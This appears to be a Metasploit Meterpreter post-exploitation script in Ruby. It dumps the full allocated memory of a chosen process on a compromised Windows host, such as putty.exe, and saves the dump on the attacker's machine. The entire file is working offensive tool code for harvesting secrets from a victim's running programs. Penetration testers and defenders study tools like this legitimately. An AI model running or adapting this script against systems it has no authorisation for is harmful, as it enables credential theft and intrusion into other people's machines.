# $Id$
# $Revision$
# Author: Carlos Perez at carlos_perez[at]darkoperator.com
# Note: Script is based on the paper Neurosurgery With Meterpreter by
#	Colin Ames (amesc[at]attackresearch.com) David Kerb (dkerb[at]attackresearch.com)
#-------------------------------------------------------------------------------
################## Variable Declarations ##################
require 'fileutils'
pid = nil
name = nil
toggle = nil
process_match = nil
opts = Rex::Parser::Arguments.new(
	"-h" => [ false, "Help menu." ],
	"-p" => [ true, "PID of process to dump."],
	"-n" => [ true, "Name of process to dump."],
	"-t" => [ false, "toggle location information in dump."]
)

opts.parse(args) { |opt, idx, val|
	case opt
	when "-h"
		print_line("")
		print_line("USAGE:")
		print_line("EXAMPLE: run process_dump putty.exe") 
		print_line("EXAMPLE: run process_dump -p 1234") 
		print_line(opts.usage) 
		raise Rex::Script::Completed
	when "-p"
		pid = val
	when "-n"
		name = val
	when "-t"
		toggle = true
	else
		process_match = val
	end
}



def find_procname(pid)
	name = nil
	client.sys.process.get_processes.each do |proc|
		if proc['pid'] == pid.to_i
			puts "found"
			name = proc['name']
		end
	end
	return name
end

def find_pids(name)
	proc_pid = []
	client.sys.process.get_processes.each do |proc|
		if proc['name'] == name
			proc_pid << proc['pid']
		end
	end
	return proc_pid
end
def dump_mem(pid,name, toggle)
	dump = ""
	host,port = client.tunnel_peer.split(':')
	# Create Filename info to be appended to created files
	filenameinfo = "_#{name}_#{pid}_" + ::Time.now.strftime("%Y%m%d.%M%S")
	# Create a directory for the logs
	logs = ::File.join(Msf::Config.log_directory, 'scripts', 'proc_memdump')
	# Create the log directory
	::FileUtils.mkdir_p(logs)
	#Dump file name
	dumpfile = logs + ::File::Separator + host + filenameinfo + ".dmp"
	print_status("Dumpping Memory of with PID: #{pid.to_s}")
	begin
		dump_process = client.sys.process.open(pid.to_i, PROCESS_READ)
	rescue
		print_error("Could not open process for reading memory!")
		raise Rex::Script::Completed
	end
	# MaximumApplicationAddress for 32bit or close enough
	maximumapplicationaddress = 2147418111
	base_size = 0
	while base_size < maximumapplicationaddress
		mbi = dump_process.memory.query(base_size)
		# Check if Allocated
		if mbi["Available"].to_s == "false"
			dump << mbi.inspect if toggle
			dump << dump_process.memory.read(mbi["BaseAddress"],mbi["RegionSize"]) 
			print_status("\tbase size = #{base_size}")
		end
		base_size += mbi["RegionSize"]
	end
	print_status("Saving Dumped Memory to #{dumpfile}")
	file_local_write(dumpfile,dump)
end
if client.platform =~ /win32|win64/
	if pid
		proc_name = find_procname(pid)
		print_status("Dumping memory for #{proc_name}")
		dump_mem(pid,proc_name,toggle)
	elsif name
		print_status("Dumping memory for #{name}")
		find_pids(name).each do |p|
			dump_mem(p,name,toggle)
		end
	end
else
	print_error("This version of Meterpreter is not supported with this Script!")
	raise Rex::Script::Completed
end



